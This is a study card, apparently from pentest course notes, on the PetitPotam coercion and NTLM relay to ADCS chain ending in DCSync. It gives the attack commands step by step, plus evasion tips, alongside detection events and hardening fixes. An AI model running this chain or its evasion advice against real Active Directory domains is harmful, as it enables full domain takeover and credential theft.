name: PetitPotam + NTLM Relay → ADCS Certificate
description: Two-step attack: (1) ntlmrelayx listens for NTLM auth and relays it to the ADCS web enrollment endpoint to obtain a DC certificate. (2) PetitPotam (MS-EFSRPC) forces the DC to authenticate to your listener. Combined: coerce DC's machine account to authenticate → relay to ADCS → get DC certificate → PKINIT → DCSync. Unauthenticated (CVE-2021-36942) or authenticated variant.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== THE PETITPOTAM + ADCS CHAIN ===
This is a multi-step chain combining three attack primitives:

1. NTLM RELAY SETUP (this card, ntlmrelayx):
   ntlmrelayx.py --target http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController
   → Listening for NTLM auth to relay to ADCS web enrollment

2. FORCE DC TO AUTHENTICATE (PetitPotam):
   python3 PetitPotam.py <attacker_ip> <dc_ip>
   → Triggers DC machine account (DC01$) to authenticate via MS-EFSRPC
   → ntlmrelayx catches DC01$'s NTLM auth and relays to ADCS
   → ADCS issues a certificate to DC01$ (DomainController template)

3. GET TGT FROM CERT (gettgtpkinit.py — ad-pkinit-gettgt):
   gettgtpkinit.py -pfx-base64 <base64cert> INLANEFREIGHT/ACADEMY-EA-DC01$@DC01 dc01.ccache
   → Uses the certificate via PKINIT to get a Kerberos TGT for DC01$

4. GET NT HASH FROM TGT (getnthash.py — ad-pkinit-getnthash):
   getnthash.py -key <session_key> INLANEFREIGHT/DC01$
   → Extracts DC01$'s NT hash from the TGT

5. DCSYNC (secretsdump.py — ad-secretsdump-dcsync):
   secretsdump.py -just-dc-user administrator -hashes :<dc_nt_hash> DC01@<dc_ip>
   → DCSync as DC01$ (machine accounts can replicate!)

=== REQUIREMENTS FOR THE ATTACK ===
  - ADCS installed in the domain with web enrollment enabled (HTTP endpoint)
  - DomainController certificate template available and enrollable
  - SMB signing disabled on CA host (or NTLM relay to HTTP works regardless)
  - CVE-2021-36942 unpatched (or authenticated variant with any domain creds)

=== CHECK FOR ADCS ===
crackmapexec ldap <dc_ip> -u user -p pass -M adcs
or: ldapsearch for pKIEnrollmentService objectClass

=== DETECTION ===
Event 4768/4769 for machine account Kerberos tickets, certificate requests
from unexpected sources (web enrollment logs on the CA), NTLM auth from DC
machine account to non-DC destinations.

defense.why_it_works: Two-stage chain: (1) PetitPotam (CVE-2021-36942) abuses MS-EFSRPC (EfsRpcOpenFileRaw or related functions) to coerce the target DC into initiating an outbound NTLM authentication to an attacker-controlled listener — the DC machine account authenticates as DC$. (2) ntlmrelayx relays this NTLM authentication to the ADCS HTTP Web Enrollment endpoint. If ADCS Web Enrollment is not protected by EPA (Extended Protection for Authentication) or channel binding, the relay succeeds and ntlmrelayx requests a certificate for DC$ from the CA. The resulting certificate is then used for PKINIT authentication and DCSync.
defense.prerequisites: ADCS installed and HTTP Web Enrollment accessible (no EPA, no channel binding). ntlmrelayx running and pointed at the ADCS web enrollment URL. PetitPotam available. Network access to DC (MS-EFSRPC on TCP 135/dynamic RPC). Credentials optional for unauthenticated variant (CVE-2021-36942, pre-patch).
defense.impact: DC machine account certificate → PKINIT TGT → NT hash via getnthash.py → DCSync = full domain compromise. Achievable from any network position with no elevated credentials if ADCS is misconfigured. One of the most impactful post-2021 AD attack chains.
defense.detection: Event 4624 type 3 on ADCS server from DC machine account (DC$ authenticating to ADCS web server is anomalous — never happens in legitimate operation). ADCS events 4886 (certificate requested) and 4887 (certificate issued) for DC machine account from unexpected IP. NTLM relay traffic in network captures (DC IP connects outbound on TCP 80/443 to attacker's listener). Microsoft Defender for Identity detects NTLM relay and coercion attempts. Event 4769 on DC when PKINIT TGT is requested following the relay.
defense.artifacts: ADCS enrollment log (cert request + issuance for DC$), Event 4624 on attacker's listener host, network NTLM relay traffic, .pfx certificate file on attacker's disk, KRB5CCNAME ccache file.
defense.prevention: Enable Extended Protection for Authentication (EPA) on ALL ADCS web enrollment endpoints (IIS setting — breaks the NTLM relay). Disable HTTP on ADCS, enforce HTTPS with channel binding. Apply patch KB5005413 (August 2021) which requires EPA for web enrollment. Consider disabling MS-EFSRPC on DCs (disable EFS if not needed) or blocking RPC to DC from untrusted hosts. Monitor ADCS for certificate requests by machine accounts. Disable NTLM where feasible. Remove unnecessary ADCS templates that allow machine authentication certificate issuance.
defense.evasion: Operate during business hours when NTLM auth from the DC may be less anomalous. The relay window is brief — ntlmrelayx must be ready before PetitPotam is triggered. The certificate and ccache created are local artifacts on the attacker's Linux host — no Windows-side artifacts until DCSync follows.
defense.misconfiguration: The MS-EFSRPC interface (LSARPC/EfsRpcOpenFileRaw) allows unauthenticated (or authenticated in older variants) callers to coerce a Windows machine into authenticating to an arbitrary host via NTLM. When combined with an ADCS web enrollment endpoint (http://CA/certsrv/) that does not require HTTPS or Extended Protection for Authentication (EPA), the relayed authentication can be used to request a certificate for the DC machine account — which can then be used to obtain a TGT and perform DCSync.
defense.vulnerable_config:
# ADCS web enrollment without EPA or HTTPS:
# URL reachable: http://CA01/certsrv/  (no HTTPS redirect)
# EPA (Extended Protection for Authentication) = NOT configured

# IIS applicationHost.config (vulnerable):
# <security><authentication><windowsAuthentication>
#   <extendedProtection tokenChecking="None" />
# </windowsAuthentication></authentication></security>

# MS-EFSRPC coercion: unauthenticated (pre-patch) or low-priv user can call:
# EfsRpcOpenFileRaw(\\attacker@443\share) -> DC authenticates outbound
defense.secure_config:
# Fix 1 — Enable EPA on ADCS web enrollment (IIS):
# IIS Manager -> certsrv site -> Authentication -> Windows Auth -> Providers
# Set Extended Protection to 'Required'
# OR via command:
Import-Module WebAdministration
Set-WebConfigurationProperty -Filter '//security/authentication/windowsAuthentication' \
    -Name extendedProtection -Value @{tokenChecking='Require'} -PSPath 'IIS:\\' -Location 'Default Web Site/certsrv'

# Fix 2 — Enable HTTPS only on certsrv:
New-WebBinding -Name 'Default Web Site' -Protocol https -Port 443
# Redirect HTTP to HTTPS

# Fix 3 — Patch MS-EFSRPC: KB5005413 (Aug 2021)
# Fix 4 — Enable SMB signing on all hosts (blocks NTLM relay)
# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled
